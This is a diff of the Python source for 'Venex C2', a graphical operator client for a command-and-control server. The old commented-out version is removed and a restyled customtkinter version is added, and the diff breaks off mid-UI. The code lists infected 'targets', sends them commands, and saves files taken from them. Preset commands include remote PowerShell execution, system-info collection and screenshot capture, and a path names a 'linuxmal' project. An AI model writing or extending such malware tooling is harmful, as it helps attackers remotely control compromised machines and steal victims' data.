@@ -1,582 +1,11 @@
-# import base64
-# import socket
-# import threading
-# import time
-# import tkinter as tk
-# from tkinter import ttk, scrolledtext, messagebox
-# from datetime import datetime, timedelta
-# from queue import Queue
-# import re
-# import ipaddress
-
-# RED = "\033[31m"
-# GREEN = "\033[32m"
-# YELLOW = "\033[33m"
-# RESET = "\033[0m"
-
-# class C2Client:
-#     def __init__(self, root):
-#         self.root = root
-#         self.root.title("Venex C2 Server Client")
-#         self.root.geometry("1000x700")
-        
-#         # Theme variables
-#         self.dark_mode = True
-#         self.setup_theme()
-        
-#         # Connection variables
-#         self.server_ip = tk.StringVar(value="127.0.0.1")
-#         self.server_port = tk.IntVar(value=7777)
-#         self.connected = False
-#         self.socket = None
-#         self.receive_thread = None
-        
-#         # Target tracking
-#         self.targets = {}  # {target_id: {"last_seen": timestamp, "socket": socket_info}}
-#         self.target_lock = threading.Lock()
-        
-#         # Interaction state
-#         self.interacting_with_target = None
-        
-#         # GUI update queue
-#         self.gui_queue = Queue()
-        
-#         # Setup GUI
-#         self.setup_gui()
-        
-#         # Start the cleanup thread
-#         self.cleanup_thread = threading.Thread(target=self.cleanup_old_targets, daemon=True)
-#         self.cleanup_thread.start()
-        
-#         # Start processing GUI updates
-#         self.process_gui_updates()
-
-#     def setup_theme(self):
-#         if self.dark_mode:
-#             # Dark theme colors
-#             self.bg_color = "#252525"         # almost black background
-#             self.fg_color = "#e6e6e6"         # light gray text
-#             self.entry_bg = "#1a1a1a"         # darker entry fields
-#             self.button_bg = "#262626"        # dark buttons
-#             self.tree_bg = "#1f1f1f"          # darker treeview background
-#             self.tree_fg = "#e6e6e6"          # light gray tree text
-#             self.tree_selected = "#D3362B"    # selected row slightly lighter
-#             self.text_bg = "#1a1a1a"          # dark text area background
-#             self.text_fg = "#e6e6e6"          # light text color
-#             self.frame_bg = "#252525"         # dark frame background
-#             self.data_color = "#22DD22"
-#         else:
-#             # Light theme colors
-#             self.bg_color = "#ffffff"         # main background
-#             self.fg_color = "#000000"         # main text color
-#             self.entry_bg = "#f0f0f0"         # entry fields background
-#             self.button_bg = "#e0e0e0"        # buttons background
-#             self.tree_bg = "#ffffff"          # treeview background
-#             self.tree_fg = "#000000"          # treeview text color
-#             self.tree_selected = "#c53d3d"    # selected row highlight
-#             self.text_bg = "#f5f5f5"          # text area background
-#             self.text_fg = "#000000"          # text area color
-#             self.frame_bg = "#f7f7f7"         # frame background
-#             self.data_color = "#002BB8"
-        
-#         # Apply to root window
-#         self.root.configure(bg=self.bg_color)
-        
-#         # Configure style
-#         self.style = ttk.Style()
-#         self.style.theme_use('clam')
-        
-#         # Configure ttk styles
-#         self.style.configure('.', background=self.bg_color, foreground=self.fg_color)
-#         self.style.configure('TFrame', background=self.frame_bg)
-#         self.style.configure('TLabel', background=self.frame_bg, foreground=self.fg_color)
-#         self.style.configure('TButton', background=self.button_bg, foreground=self.fg_color)
-#         self.style.configure('TEntry', fieldbackground=self.entry_bg, foreground=self.fg_color)
-#         self.style.configure('TScrollbar', background=self.button_bg, troughcolor=self.bg_color)
-#         self.style.configure('Treeview', 
-#                             background=self.tree_bg, 
-#                             foreground=self.tree_fg,
-#                             fieldbackground=self.tree_bg)
-#         self.style.map('Treeview', background=[('selected', self.tree_selected)])
-#         self.style.configure('Treeview.Heading', 
-#                             background=self.button_bg, 
-#                             foreground=self.fg_color)
-#         self.style.configure('TLabelframe', background=self.frame_bg, foreground=self.fg_color)
-#         self.style.configure('TLabelframe.Label', background=self.frame_bg, foreground=self.fg_color)
-
-#     def toggle_theme(self):
-#         """Toggle between dark and light mode"""
-#         self.dark_mode = not self.dark_mode
-#         self.setup_theme()
-#         self.refresh_widget_colors()
-
-#     def refresh_widget_colors(self):
-#         """Refresh widget colors after theme change"""
-#         # Refresh messages text widgets
-#         self.messages_text.config(bg=self.text_bg, fg=self.text_fg, insertbackground=self.fg_color)
-#         self.data_messages_text.config(bg=self.text_bg, fg=self.data_color, insertbackground=self.data_color)
-        
-#         # Refresh target menu
-#         self.target_menu.config(bg=self.button_bg, fg=self.fg_color)
-
-#     def setup_gui(self):
-#         # Main container with left and right panes
-#         main_paned = ttk.PanedWindow(self.root, orient=tk.HORIZONTAL)
-#         main_paned.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=10, pady=5)
-
-#         # Left frame (Targets and Connection info) - larger
-#         left_frame = ttk.Frame(main_paned)
-#         main_paned.add(left_frame, weight=1)  # Larger weight = more space
-
-#         # Right frame (Data messages) - very small
-#         right_frame = ttk.Frame(main_paned)
-#         main_paned.add(right_frame, weight=1)  # Smaller weight = less space
-        
-#         # Connection frame
-#         connection_frame = ttk.Frame(self.root, padding="10")
-#         connection_frame.grid(row=0, column=0, sticky=(tk.W, tk.E))
-        
-#         ttk.Label(connection_frame, text="Server IP:").grid(row=0, column=0, sticky=tk.W)
-#         ip_entry = ttk.Entry(connection_frame, textvariable=self.server_ip, width=15)
-#         ip_entry.grid(row=0, column=1, sticky=tk.W)
-        
-#         ttk.Label(connection_frame, text="Port:").grid(row=0, column=2, sticky=tk.W)
-#         port_entry = ttk.Entry(connection_frame, textvariable=self.server_port, width=10)
-#         port_entry.grid(row=0, column=3, sticky=tk.W)
-        
-#         self.connect_btn = ttk.Button(connection_frame, text="Connect", command=self.toggle_connection)
-#         self.connect_btn.grid(row=0, column=4, padx=5)
-        
-#         # Theme toggle button
-#         self.theme_btn = ttk.Button(connection_frame, text="☀️", command=self.toggle_theme, width=3)
-#         self.theme_btn.grid(row=0, column=5, padx=5)
-        
-#         # Targets frame (Left side)
-#         targets_frame = ttk.LabelFrame(left_frame, text="Connected Targets", padding="10")
-#         targets_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(0, 5), pady=5)
-        
-#         # Treeview for targets
-#         columns = ("target_id", "last_seen", "status")
-#         self.targets_tree = ttk.Treeview(targets_frame, columns=columns, show="headings")
-#         self.targets_tree.heading("target_id", text="Target ID")
-#         self.targets_tree.heading("last_seen", text="Last Seen")
-#         self.targets_tree.heading("status", text="Status")
-        
-#         self.targets_tree.column("target_id", width=200)
-#         self.targets_tree.column("last_seen", width=150)
-#         self.targets_tree.column("status", width=100)
-        
-#         # Scrollbar for treeview
-#         tree_scroll = ttk.Scrollbar(targets_frame, orient=tk.VERTICAL, command=self.targets_tree.yview)
-#         self.targets_tree.configure(yscrollcommand=tree_scroll.set)
-        
-#         self.targets_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
-#         tree_scroll.grid(row=0, column=1, sticky=(tk.N, tk.S))
-        
-#         # Messages frame (Left side - for connection and target messages)
-#         data_messages_frame = ttk.LabelFrame(left_frame, text="Data Messages", padding="10")
-#         data_messages_frame.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(0, 5), pady=5)
-        
-#         self.data_messages_text = scrolledtext.ScrolledText(data_messages_frame, width=70, height=15, 
-#                                                      bg=self.text_bg, fg=self.data_color,
-#                                                      insertbackground=self.data_color)
-#         self.data_messages_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
-        
-#         # # Data Messages frame (Right side - for DATA messages only)
-#         messages_frame = ttk.LabelFrame(right_frame, text="Connection Messages", padding="10")
-#         messages_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(5, 0), pady=5)
-        
-#         self.messages_text = scrolledtext.ScrolledText(messages_frame, width=30, height=20, 
-#                                                           bg=self.text_bg, fg=self.text_fg,
-#                                                           insertbackground=self.fg_color)
-#         self.messages_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
-        
-#         # Command frame (Bottom - spans both columns)
-#         command_frame = ttk.Frame(self.root, padding="10")
-#         command_frame.grid(row=2, column=0, sticky=(tk.W, tk.E))
-
-#         # Mode row frame
-#         mode_frame = ttk.Frame(command_frame)
-#         mode_frame.grid(row=0, column=0, sticky=(tk.W, tk.E))
-
-#         # Command row frame
-#         cmd_frame = ttk.Frame(command_frame)
-#         cmd_frame.grid(row=1, column=0, sticky=(tk.W, tk.E))
-
-#         # Mode row content
-#         self.interaction_status = ttk.Label(mode_frame, text="Mode: C2")
-#         self.interaction_status.grid(row=0, column=0, sticky=tk.W)
-
-#         self.normal_mode_btn = ttk.Button(mode_frame, text="C2 mode", 
-#                                         command=self.switch_to_normal_mode, state=tk.DISABLED)
-#         self.normal_mode_btn.grid(row=0, column=1, padx=5, sticky=tk.W)
-
-#         # Command row content
-#         ttk.Label(cmd_frame, text="Command:").grid(row=0, column=0, sticky=tk.W)
-#         self.command_entry = ttk.Entry(cmd_frame, width=50)
-#         self.command_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=5)
-#         self.command_entry.bind("<Return>", self.send_command)
-
-#         ttk.Button(cmd_frame, text="Send", command=self.send_command).grid(row=0, column=2, padx=5)
-
-#         # Configure column weights for each sub-frame
-#         mode_frame.columnconfigure(0, weight=1)
-#         mode_frame.columnconfigure(1, weight=0)
-
-#         cmd_frame.columnconfigure(0, weight=0)
-#         cmd_frame.columnconfigure(1, weight=1)
-#         cmd_frame.columnconfigure(2, weight=0)
-
-#         # Configure main command frame
-#         command_frame.columnconfigure(0, weight=1)
-        
-#         # Configure grid weights for left and right frames
-#         left_frame.columnconfigure(0, weight=1)
-#         left_frame.rowconfigure(0, weight=1)
-#         left_frame.rowconfigure(1, weight=1)
-        
-#         right_frame.columnconfigure(0, weight=1)
-#         right_frame.rowconfigure(0, weight=1)
-        
-#         targets_frame.columnconfigure(0, weight=1)
-#         targets_frame.rowconfigure(0, weight=1)
-        
-#         data_messages_frame.columnconfigure(0, weight=1)
-#         data_messages_frame.rowconfigure(0, weight=1)
-        
-#         messages_frame.columnconfigure(0, weight=1)
-#         messages_frame.rowconfigure(0, weight=1)
-
-#         # Configure main window grid weights
-#         self.root.columnconfigure(0, weight=1)
-#         self.root.rowconfigure(1, weight=1)
-
-#         # Right-click menu for targets
-#         self.target_menu = tk.Menu(self.root, tearoff=0, bg=self.button_bg, fg=self.fg_color)
-#         self.target_menu.add_command(label="Interact", command=self.interact_with_target)
-        
-#         # Bind right-click to treeview
-#         self.targets_tree.bind("<Button-3>", self.show_target_menu)
-
-#     def process_gui_updates(self):
-#         """Process all pending GUI updates from the queue"""
-#         try:
-#             while True:
-#                 # Get all pending updates (non-blocking)
-#                 callback, args = self.gui_queue.get_nowait()
-#                 callback(*args)
-#         except:
-#             pass  # Queue is empty
-        
-#         # Schedule next check
-#         self.root.after(100, self.process_gui_updates)
-
-#     def show_target_menu(self, event):
-#         """Show context menu on right-click"""
-#         item = self.targets_tree.identify_row(event.y)
-#         if item:
-#             self.targets_tree.selection_set(item)
-#             self.target_menu.post(event.x_root, event.y_root)
-
-#     def interact_with_target(self):
-#         """Set interaction with selected target"""
-#         selected = self.targets_tree.selection()
-#         if selected:
-#             target_id = self.targets_tree.item(selected[0], "values")[0]
-#             self.interacting_with_target = target_id
-#             self.interaction_status.config(text=f"Mode: Interacting with {target_id}")
-#             self.normal_mode_btn.config(state=tk.NORMAL)
-#             self.log_message(f"Now interacting with target: {target_id}")
-
-#     def switch_to_normal_mode(self):
-#         """Switch back to normal command mode"""
-#         self.interacting_with_target = None
-#         self.interaction_status.config(text="Mode: C2")
-#         self.normal_mode_btn.config(state=tk.DISABLED)
-#         self.log_message("Switched back to normal mode")
-
-#     def toggle_connection(self):
-#         if not self.connected:
-#             self.connect_to_server()
-#         else:
-#             self.disconnect_from_server()
-    
-#     def is_ip(self, addr):
-#         """Check if the input is a valid IPv4 or IPv6 address"""
-#         try:
-#             ipaddress.ip_address(addr)
-#             return True
-#         except ValueError:
-#             return False
-
-#     def resolve_host(self, host):
-#         """Resolve a domain name to an IP address"""
-#         try:
-#             return socket.gethostbyname(host)
-#         except socket.gaierror:
-#             return None
-
-#     def connect_to_server(self):
-#         host_input = self.server_ip.get()
-
-#         # Determine IP
-#         if self.is_ip(host_input):
-#             ip = host_input
-#         else:
-#             ip = self.resolve_host(host_input)
-#             if ip is None:
-#                 messagebox.showerror("Error", f"Cannot resolve domain: {host_input}")
-            
-#         try:
-#             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#             self.socket.connect((self.server_ip.get(), self.server_port.get()))
-#             self.connected = True
-#             self.connect_btn.config(text="Disconnect")
-            
-#             # Start receive thread
-#             self.receive_thread = threading.Thread(target=self.receive_messages, daemon=True)
-#             self.receive_thread.start()
-            
-#             self.log_message("Connected to server")
-            
-#         except Exception as e:
-#             messagebox.showerror("Connection Error", f"Failed to connect: {str(e)}")
-
-#     def disconnect_from_server(self):
-#         self.connected = False
-#         if self.socket:
-#             self.socket.close()
-#             self.socket = None
-        
-#         self.connect_btn.config(text="Connect")
-#         self.log_message("Disconnected from server")
-        
-#         # Clear targets
-#         with self.target_lock:
-#             self.targets.clear()
-#             # Queue the treeview clearing operation
-#             self.gui_queue.put((self._clear_targets_tree, ()))
-        
-#         # Reset interaction state
-#         self.switch_to_normal_mode()
-
-#     def send_command(self, event=None):
-#         if not self.connected:
-#             messagebox.showwarning("Not Connected", "Not connected to server")
-#             return
-            
-#         command = self.command_entry.get()
-#         if not command:
-#             return
-            
-#         try:
-#             # Format command based on interaction mode
-#             if self.interacting_with_target:
-#                 formatted_command = f"TARGET:{self.interacting_with_target}:{command}"
-#             else:
-#                 formatted_command = command
-                
-#             self.socket.sendall((formatted_command + "\n").encode())
-#             self.command_entry.delete(0, tk.END)
-#             self.log_message(f"Sent: {formatted_command}")
-#         except Exception as e:
-#             self.log_message(f"Error sending command: {str(e)}")
-
-#     def receive_messages(self):
-#         buffer = b""
-#         while self.connected:
-#             try:
-#                 data = self.socket.recv(4096)
-#                 if not data:
-#                     break  # connection closed
-
-#                 buffer += data
-
-#                 # process complete messages only
-#                 while b"END_OF" in buffer:
-#                     line, buffer = buffer.split(b"END_OF", 1)
-#                     line = line.strip()
-                    
-#                     if line:
-#                         self.process_message(line)
-
-#             except Exception as e:
-#                 if self.connected:
-#                     self.log_message(f"Error receiving data: {str(e)}")
-#                 break
-
-#         if self.connected:
-#             self.gui_queue.put((self.disconnect_from_server, ()))
-
-#     def process_message(self, message):
-#         # print(message)
-#         # Check if this is a target registration message
-#         if message.startswith(b"TARGET:"):
-#             # Extract target ID from previous command
-#             target_id = message[7:].strip().decode('utf-8')
-#             self.add_target(target_id)
-        
-#         elif message.startswith(b"/DATA:"):
-#             message = message[5:].decode('utf-8')  # remove "DATA:"
-#             lines = message.split("\n")  # split into all lines
-#             self.gui_queue.put((self.log_data_message, (f"",)))
-#             for line in lines:
-#                 if line.strip():  # optional: skip empty lines
-#                     clean_line = re.sub(r'\s+$', '', line)
-#                     self.gui_queue.put((self.log_data_message, (f" $$-> {clean_line}",)))
-
-#         elif message.startswith(b"/WRITE:"):
-
-#             try:
-#                 # Split only first two ":" so base64 remains untouched
-#                 _, filename, ext, b64data = message.split(b":", 3)
-
-#                 filename = filename.decode('utf-8')
-#                 ext = ext.decode('utf-8')
-
-#                 # Convert Base64 → raw bytes
-#                 file_bytes = b64data
-
-#                 # Create filename
-#                 filename = f"D:\\linuxmal\\C2Client\\content_box\\{filename}.{ext.lower()}"
-
-#                 # Save file
-#                 with open(filename, "wb") as f:
-#                     f.write(file_bytes)
-
-#                 self.log_message(f"Saved file as {filename}")
-
-#             except Exception as e:
-#                 self.log_message(f"Error handling WRITE message: {e}")
-#         else:
-#             self.gui_queue.put((self.log_message, (f"Received: {message.decode("utf-8")}",)))
-
-#     def add_target(self, target_id):
-#         with self.target_lock:
-
-#             if target_id not in self.targets:
-#                 # Create new entry
-#                 self.targets[target_id] = {
-#                     "last_seen": datetime.now(),
-#                     "status": "Active"
-#                 }
-
-#                 # Add to treeview via queue
-#                 self.gui_queue.put((self._add_target_to_tree, (target_id,)))
-#                 self.gui_queue.put((self.log_message, (f"New target connected: {target_id}",)))
-#             else:
-#                 # Update existing entry
-#                 self.targets[target_id]["last_seen"] = datetime.now()
-#                 self.gui_queue.put((self._update_target_in_tree, (target_id,)))
-
-#     def update_target(self, target_id):
-#         with self.target_lock:
-#             if target_id in self.targets:
-#                 self.targets[target_id]["last_seen"] = datetime.now()
-#                 self.targets[target_id]["status"] = "Active"
-                
-#                 # Update treeview via queue
-#                 self.gui_queue.put((self._update_target_in_tree, (target_id,)))
-
-#     def remove_target(self, target_id):
-#         with self.target_lock:
-#             if target_id in self.targets:
-#                 del self.targets[target_id]
-                
-#                 # Remove from treeview via queue
-#                 self.gui_queue.put((self._remove_target_from_tree, (target_id,)))
-#                 self.gui_queue.put((self.log_message, (f"Target removed: {target_id}",)))
-                
-#                 # If we were interacting with this target, switch to normal mode
-#                 if self.interacting_with_target == target_id:
-#                     self.gui_queue.put((self.switch_to_normal_mode, ()))
-
-#     def _clear_targets_tree(self):
-#         """Clear all items from the targets treeview"""
-#         for item in self.targets_tree.get_children():
-#             self.targets_tree.delete(item)
-
-#     def _add_target_to_tree(self, target_id):
-#         with self.target_lock:
-#             if target_id in self.targets:
-#                 target = self.targets[target_id]
-#                 self.targets_tree.insert("", "end", values=(
-#                     target_id, 
-#                     target["last_seen"].strftime("%H:%M:%S"),
-#                     target["status"]
-#                 ))
-
-#     def _update_target_in_tree(self, target_id):
-#         with self.target_lock:
-#             if target_id in self.targets:
-#                 target = self.targets[target_id]
-                
-#                 # Find the item in the treeview
-#                 for item in self.targets_tree.get_children():
-#                     if self.targets_tree.item(item, "values")[0] == target_id:
-#                         self.targets_tree.item(item, values=(
-#                             target_id,
-#                             target["last_seen"].strftime("%H:%M:%S"),
-#                             target["status"]
-#                         ))
-#                         break
-
-#     def _remove_target_from_tree(self, target_id):
-#         # Find and remove the item from the treeview
-#         for item in self.targets_tree.get_children():
-#             if self.targets_tree.item(item, "values")[0] == target_id:
-#                 self.targets_tree.delete(item)
-#                 break
-
-#     def cleanup_old_targets(self):
-#         """Remove targets that haven't been seen in 5 minutes"""
-#         while True:
-#             time.sleep(30)  # Check every 30 seconds
-            
-#             if not self.connected:
-#                 continue
-                
-#             now = datetime.now()
-#             to_remove = []
-            
-#             with self.target_lock:
-#                 for target_id, target_info in self.targets.items():
-#                     if now - target_info["last_seen"] > timedelta(minutes=5):
-#                         to_remove.append(target_id)
-            
-#             for target_id in to_remove:
-#                 self.remove_target(target_id)
-
-#     def log_message(self, message):
-#         """Log general messages to the left message window"""
-#         timestamp = datetime.now().strftime("%H:%M:%S")
-#         self.messages_text.insert(tk.END, f"[{timestamp}] {message}\n")
-#         self.messages_text.see(tk.END)
-
-#     def log_data_message(self, message):
-#         """Log DATA messages to the right message window"""
-#         # Configure tag for the specified color if it doesn't exist
-
-#         self.data_messages_text.insert(tk.END, f"{message}\n")
-#         self.data_messages_text.see(tk.END)
-
-#     def __del__(self):
-#         self.connected = False
-#         if self.socket:
-#             self.socket.close()
-
-# if __name__ == "__main__":
-#     root = tk.Tk()
-#     app = C2Client(root)
-#     root.protocol("WM_DELETE_WINDOW", root.quit)
-#     root.mainloop()
-
 import base64
+import hashlib
 import socket
 import threading
 import time
 import tkinter as tk
-from tkinter import ttk, scrolledtext, messagebox, filedialog
+from tkinter import messagebox, filedialog, ttk
+import customtkinter as ctk
 from datetime import datetime, timedelta
 from queue import Queue
 import re
@@ -584,912 +13,1579 @@ import ipaddress
 import os
 import subprocess
 import platform
+import shutil
 
-RED = "\033[31m"
-GREEN = "\033[32m"
-YELLOW = "\033[33m"
-RESET = "\033[0m"
+# --- Premium Windows 11 Styling ---
+ctk.set_appearance_mode("Dark")
+ctk.set_default_color_theme("blue")
 
-class C2Client:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("Venex C2 Server Client")
-        self.root.geometry("1200x800")  # Increased width for new tab
+# Color Palette
+ACCENT_BLUE = "#0078d4"
+ACCENT_HOVER = "#005a9e"
+BG_DARK = "#202020"
+CARD_DARK = "#2b2b2b"
+TEXT_PRIMARY = "#ffffff"
+TEXT_SECONDARY = "#a0a0a0"
+SUCCESS_GREEN = "#22DD22"
+DANGER_RED = "#d13438"
+
+class PremiumC2Client(ctk.CTk):
+    def __init__(self):
+        super().__init__()
+
+        self.protocol("WM_DELETE_WINDOW", self.on_close)
         
-        # Theme variables
-        self.dark_mode = True
-        self.setup_theme()
+        # defult hash token
+        self.sha256_token = "NONE"
+
+        # create configeration directory and files if not exist
+        self.config_dir = "config"
+        self.config_file = os.path.join(self.config_dir, "venex_client.vconf")
         
-        # Connection variables
-        self.server_ip = tk.StringVar(value="127.0.0.1")
+        # Window configuration
+        self.title("Venex C2 - Windows 11 Edition")
+        self.geometry("1400x900")
+        self.minsize(1100, 750)
+        self.configure(fg_color=BG_DARK)
+
+        # Logic Variables
+        self.server_ip = tk.StringVar(value="")
         self.server_port = tk.IntVar(value=7777)
+        self.auth_token = tk.StringVar(value="")
         self.connected = False
         self.socket = None
-        self.receive_thread = None
-        
-        # Target tracking
-        self.targets = {}  # {target_id: {"last_seen": timestamp, "socket": socket_info}}
+        self.targets = {}
         self.target_lock = threading.Lock()
-        
-        # Interaction state
         self.interacting_with_target = None
-        
-        # GUI update queue
         self.gui_queue = Queue()
-        
-        # File explorer variables
-        self.content_box_path = "D:\\linuxmal\\C2Client\\content_box"
+        self.content_box_path = os.path.join(os.getcwd(), "content_box")
         self.current_path = self.content_box_path
-        
-        # Create content box directory if it doesn't exist
         if not os.path.exists(self.content_box_path):
             os.makedirs(self.content_box_path)
+
+        # === AUTOCOMPLETE COMMAND LISTS ===
+        self.global_commands = ["AUTH:STOP_HTTP", "AUTH:START_HTTP"]
+        self.target_commands = ["tm powershell -command \"", "$sysinfo", "rmf" , "$screenShot"]
         
-        # Setup GUI
-        self.setup_gui()
-        
-        # Start the cleanup thread
+        self.current_commands = self.global_commands  # default mode
+
+        # Setup UI
+        self.setup_premium_ui()
+
+        # Initialize config
+        self.init_config()
+
+        # Background processes
         self.cleanup_thread = threading.Thread(target=self.cleanup_old_targets, daemon=True)
         self.cleanup_thread.start()
-        
-        # Start processing GUI updates
-        self.root.after(100, self.process_gui_updates)
-        
-        # Initialize file explorer
+        self.after(100, self.process_gui_updates)
         self.refresh_file_explorer()
 
-    def setup_theme(self):
-        if self.dark_mode:
-            # Dark theme colors
-            self.bg_color = "#252525"         # almost black background
-            self.fg_color = "#e6e6e6"         # light gray text
-            self.entry_bg = "#1a1a1a"         # darker entry fields
-            self.button_bg = "#262626"        # dark buttons
-            self.tree_bg = "#1f1f1f"          # darker treeview background
-            self.tree_fg = "#e6e6e6"          # light gray tree text
-            self.tree_selected = "#D3362B"    # selected row slightly lighter
-            self.text_bg = "#1a1a1a"          # dark text area background
-            self.text_fg = "#e6e6e6"          # light text color
-            self.frame_bg = "#252525"         # dark frame background
-            self.data_color = "#22DD22"
-            self.highlight_color = "#2a2a2a"  # For file explorer selection
-        else:
-            # Light theme colors
-            self.bg_color = "#ffffff"         # main background
-            self.fg_color = "#000000"         # main text color
-            self.entry_bg = "#f0f0f0"         # entry fields background
-            self.button_bg = "#e0e0e0"        # buttons background
-            self.tree_bg = "#ffffff"          # treeview background
-            self.tree_fg = "#000000"          # treeview text color
-            self.tree_selected = "#c53d3d"    # selected row highlight
-            self.text_bg = "#f5f5f5"          # text area background
-            self.text_fg = "#000000"          # text area color
-            self.frame_bg = "#f7f7f7"         # frame background
-            self.data_color = "#002BB8"
-            self.highlight_color = "#f0f0f0"  # For file explorer selection
-        
-        # Apply to root window
-        self.root.configure(bg=self.bg_color)
-        
-        # Configure style
-        self.style = ttk.Style()
-        self.style.theme_use('clam')
-        
-        # Configure ttk styles
-        self.style.configure('.', background=self.bg_color, foreground=self.fg_color)
-        self.style.configure('TFrame', background=self.frame_bg)
-        self.style.configure('TLabel', background=self.frame_bg, foreground=self.fg_color)
-        self.style.configure('TButton', background=self.button_bg, foreground=self.fg_color)
-        self.style.configure('TEntry', fieldbackground=self.entry_bg, foreground=self.fg_color)
-        self.style.configure('TScrollbar', background=self.button_bg, troughcolor=self.bg_color)
-        self.style.configure('Treeview', 
-                            background=self.tree_bg, 
-                            foreground=self.tree_fg,
-                            fieldbackground=self.tree_bg)
-        self.style.map('Treeview', background=[('selected', self.tree_selected)])
-        self.style.configure('Treeview.Heading', 
-                            background=self.button_bg, 
-                            foreground=self.fg_color)
-        self.style.configure('TLabelframe', background=self.frame_bg, foreground=self.fg_color)
-        self.style.configure('TLabelframe.Label', background=self.frame_bg, foreground=self.fg_color)
-        self.style.configure('TNotebook', background=self.bg_color)
-        self.style.configure('TNotebook.Tab', background=self.button_bg, foreground=self.fg_color)
-        self.style.map('TNotebook.Tab', 
-                      background=[('selected', self.bg_color)],
-                      foreground=[('selected', self.fg_color)])
 
-    def toggle_theme(self):
-        """Toggle between dark and light mode"""
-        self.dark_mode = not self.dark_mode
-        self.setup_theme()
-        self.refresh_widget_colors()
+    def setup_premium_ui(self):
+        self.grid_columnconfigure(1, weight=1)
+        self.grid_rowconfigure(0, weight=1)
 
-    def refresh_widget_colors(self):
-        """Refresh widget colors after theme change"""
-        # Refresh messages text widgets
-        self.messages_text.config(bg=self.text_bg, fg=self.text_fg, insertbackground=self.fg_color)
-        self.data_messages_text.config(bg=self.text_bg, fg=self.data_color, insertbackground=self.data_color)
-        
-        # Refresh target menu
-        self.target_menu.config(bg=self.button_bg, fg=self.fg_color)
-        
-        # Refresh file explorer
-        self.refresh_file_explorer()
+        # --- Sidebar Navigation ---
+        self.sidebar = ctk.CTkFrame(self, width=260, corner_radius=0, fg_color="#1a1a1a")
+        self.sidebar.grid(row=0, column=0, rowspan=2, sticky="nsew")
+        self.sidebar.grid_rowconfigure(4, weight=1)
 
-    def setup_gui(self):
-        # Create notebook for tabs
-        self.notebook = ttk.Notebook(self.root)
-        self.notebook.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=10, pady=5)
-        
-        # Tab 1: Main C2 Interface
-        main_tab = ttk.Frame(self.notebook)
-        self.notebook.add(main_tab, text="C2 Interface")
-        
-        # Tab 2: Content Box File Explorer
-        content_tab = ttk.Frame(self.notebook)
-        self.notebook.add(content_tab, text="Content Box")
-        
-        # Setup main tab (existing interface)
-        self.setup_main_tab(main_tab)
-        
-        # Setup content box tab
-        self.setup_content_tab(content_tab)
-        
-        # Connection frame (top of window, outside tabs)
-        connection_frame = ttk.Frame(self.root, padding="10")
-        connection_frame.grid(row=0, column=0, sticky=(tk.W, tk.E))
-        
-        ttk.Label(connection_frame, text="Server IP:").grid(row=0, column=0, sticky=tk.W)
-        ip_entry = ttk.Entry(connection_frame, textvariable=self.server_ip, width=15)
-        ip_entry.grid(row=0, column=1, sticky=tk.W)
-        
-        ttk.Label(connection_frame, text="Port:").grid(row=0, column=2, sticky=tk.W)
-        port_entry = ttk.Entry(connection_frame, textvariable=self.server_port, width=10)
-        port_entry.grid(row=0, column=3, sticky=tk.W)
-        
-        self.connect_btn = ttk.Button(connection_frame, text="Connect", command=self.toggle_connection)
-        self.connect_btn.grid(row=0, column=4, padx=5)
-        
-        # Theme toggle button
-        self.theme_btn = ttk.Button(connection_frame, text="☀️", command=self.toggle_theme, width=3)
-        self.theme_btn.grid(row=0, column=5, padx=5)
-        
-        # Command frame (Bottom - spans both columns)
-        command_frame = ttk.Frame(self.root, padding="10")
-        command_frame.grid(row=2, column=0, sticky=(tk.W, tk.E))
+        # Logo
+        self.logo_label = ctk.CTkLabel(self.sidebar, text="VENEX C2", font=ctk.CTkFont(size=24, weight="bold"))
+        self.logo_label.grid(row=0, column=0, padx=30, pady=(40, 30))
 
-        # Mode row frame
-        mode_frame = ttk.Frame(command_frame)
-        mode_frame.grid(row=0, column=0, sticky=(tk.W, tk.E))
+        # Nav Buttons
+        self.btn_dashboard = self.create_nav_button("Dashboard", "📊", 1, self.show_dashboard)
+        self.btn_content = self.create_nav_button("Content Box", "📁", 2, self.show_content)
+        self.btn_settings = self.create_nav_button("Settings", "⚙️", 3, self.show_settings)
 
-        # Command row frame
-        cmd_frame = ttk.Frame(command_frame)
-        cmd_frame.grid(row=1, column=0, sticky=(tk.W, tk.E))
+        # Sidebar Footer
+        self.status_indicator = ctk.CTkLabel(self.sidebar, text="● Disconnected", text_color=DANGER_RED, font=ctk.CTkFont(size=12))
+        self.status_indicator.grid(row=5, column=0, padx=30, pady=(0, 20), sticky="w")
 
-        # Mode row content
-        self.interaction_status = ttk.Label(mode_frame, text="Mode: C2")
-        self.interaction_status.grid(row=0, column=0, sticky=tk.W)
+        # --- Main Content Area ---
+        self.main_area = ctk.CTkFrame(self, corner_radius=20, fg_color=BG_DARK)
+        self.main_area.grid(row=0, column=1, sticky="nsew", padx=30, pady=30)
+        self.main_area.grid_columnconfigure(0, weight=1)
+        self.main_area.grid_rowconfigure(1, weight=1)
 
-        self.normal_mode_btn = ttk.Button(mode_frame, text="C2 mode", 
-                                        command=self.switch_to_normal_mode, state=tk.DISABLED)
-        self.normal_mode_btn.grid(row=0, column=1, padx=5, sticky=tk.W)
+        # Top Bar (Connection)
+        self.top_bar = ctk.CTkFrame(self.main_area, fg_color="transparent")
+        self.top_bar.grid(row=0, column=0, sticky="ew", pady=(0, 20))
+        
+        conn_card = ctk.CTkFrame(self.top_bar, fg_color=CARD_DARK, corner_radius=12, height=70)
+        conn_card.pack(fill="x")
+        
+        ctk.CTkLabel(conn_card, text="Server:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(20, 5))
+        self.ip_entry = ctk.CTkEntry(conn_card, textvariable=self.server_ip, width=150, border_width=0, fg_color="#3d3d3d")
+        self.ip_entry.pack(side="left", padx=5, pady=15)
+        
